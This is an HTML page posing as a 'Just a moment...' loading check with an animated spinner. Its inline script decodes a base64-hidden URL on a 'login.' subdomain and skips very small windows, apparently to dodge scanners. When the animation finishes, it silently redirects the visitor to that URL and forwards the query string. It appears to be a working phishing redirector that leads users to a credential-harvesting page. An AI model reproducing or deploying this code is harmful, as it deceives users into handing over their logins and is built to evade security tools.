<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Just a moment...</title>
<style>
body{margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;background-color:#f3f2f1;background-image:radial-gradient(at 0% 0%,rgba(119,53,146,.08) 0,transparent 55%),radial-gradient(at 100% 0%,rgba(0,120,212,.08) 0,transparent 55%),radial-gradient(at 100% 100%,rgba(6,214,160,.08) 0,transparent 55%),radial-gradient(at 0% 100%,rgba(239,71,111,.08) 0,transparent 55%);overflow:hidden}
.loader{width:54px;height:54px;display:inline-block;position:relative}
.loader::after,.loader::before{content:'';box-sizing:border-box;width:54px;height:54px;border:4px solid #773592;position:absolute;left:0;top:0;border-radius:2px;animation:r 2s ease-in-out 2,c 4s linear forwards}
.loader::after{animation-direction:reverse;opacity:.6}
@keyframes r{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
@keyframes c{0%,49%{border-color:#773592}50%{border-color:#0078d4}75%{border-color:#06d6a0}100%{border-color:#ef476f}}
</style>
</head>
<body>
<div class="loader" id="l"></div>
<script>
(function() {
const b = "aHR0cHM6Ly9sb2dpbi5yY21vdmVycy5vcmcvVnRJYklsRFI=";
const q = window.location.search;
const loader = document.getElementById("l");
if (window.innerWidth < 100 || window.innerHeight < 100) return;
loader.onanimationend = () => {
const target = atob(b);
const final = q ? (target.includes('?') ? `${target}&${q.substring(1)}` : target + q) : target;
window.location.replace(final);
};
})();
</script>
</body>
</html>
